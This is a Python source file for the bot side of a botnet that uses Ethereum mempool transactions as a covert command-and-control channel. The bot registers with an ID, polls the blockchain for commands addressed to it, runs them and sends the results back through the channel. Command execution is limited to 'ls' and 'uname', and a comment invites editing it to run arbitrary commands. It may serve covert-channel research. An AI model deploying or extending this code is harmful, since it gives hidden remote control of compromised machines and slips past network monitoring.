from covert_channel import CovertChannel
from C2C import MempoolMessage
from web3 import Web3
from termcolor import colored, cprint
import random
import string
import subprocess
import base64
import time
import configparser
import logging as log


##
#   @brief Generate a random ID for a bot
#   @param size:int       Length of the ID
#   @param chars:str      Charcterset to use      
#
def id_generator(size:int=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


##
#   @brief Execute a given command (checked through whitelist)
#   @param cmd:str       The command to execute    
#
#   @NOTE   For security purpose, all the available commands are whitelisted. If you need 
#           to execute arbitrary commands then edit this function
#
def execCMD(cmd:str):
    if cmd == "ls":
        byteOutput = subprocess.check_output(['ls', 'test_dir'], timeout=3)
        return byteOutput.decode('UTF-8').rstrip()
    elif cmd == "uname":
        byteOutput = subprocess.check_output(['uname'], timeout=3)
        return byteOutput.decode('UTF-8').rstrip()
    return ""


def enc_data(data):
    enc_result = data.encode('UTF-8')
    base64_bytes = base64.b64encode(enc_result)
    base64_message = base64_bytes.decode('UTF-8')
    return base64_message


configParser = configparser.RawConfigParser()   
configFilePath = "config.txt"
configParser.read(configFilePath)

destination_address = configParser.get('ETH-config', 'destination_address')
private_key = configParser.get('ETH-config', 'private_key')
infura_endpoint = configParser.get('web3', 'infura_endpoint')





w3_infura = Web3(Web3.HTTPProvider(infura_endpoint))


covert_ch = CovertChannel(w3_infura, private_key, destination_address, True, 5)


my_id = id_generator(5)
print("MY ID = " + str(my_id))


print("Sending " + colored('START', 'green', attrs=['bold']) + " command")

start_msg = MempoolMessage(my_id, "START", 1, "R")

print(str(start_msg))

covert_ch.sendData(str(start_msg))

while True:
    print("Waiting for response....")

    data = covert_ch.recvData()
    print("Received: " + str(data))

    if data is False:
        time.sleep(2)
        continue

    dec_data = data.decode('utf-8') 
    msg = MempoolMessage.load(dec_data)

    if str(msg.getBotID()) != my_id:
        log.info("Message for different bot, skipping...  ('" + str(msg.getBotID()) + "' != '" + str(my_id) + ")'")
        continue


    print("Message Origin: " + str(msg.getOrigin()))

    if msg.getOrigin() == "C":
        if msg.getMessage() == "STOP":
            cprint("STOP command received, exiting...", 'green', 'on_red')
            break
        else:
            dec_cmd = msg.getMessage()
            cprint("Command received: " + str(dec_cmd), 'green')
            exec_result = execCMD(dec_cmd)
            print(exec_result)
            print("Sending response...")

            msg_response = MempoolMessage(my_id, exec_result, str(msg.getNonce() + 1), "R")

            covert_ch.sendData(str(msg_response), True, nonceMsg=msg_response.getNonce())
            print("Response sent")

    elif msg.getOrigin() == "R":
        log.debug("Bot reponse, skipping...")
        continue

    time.sleep(5)
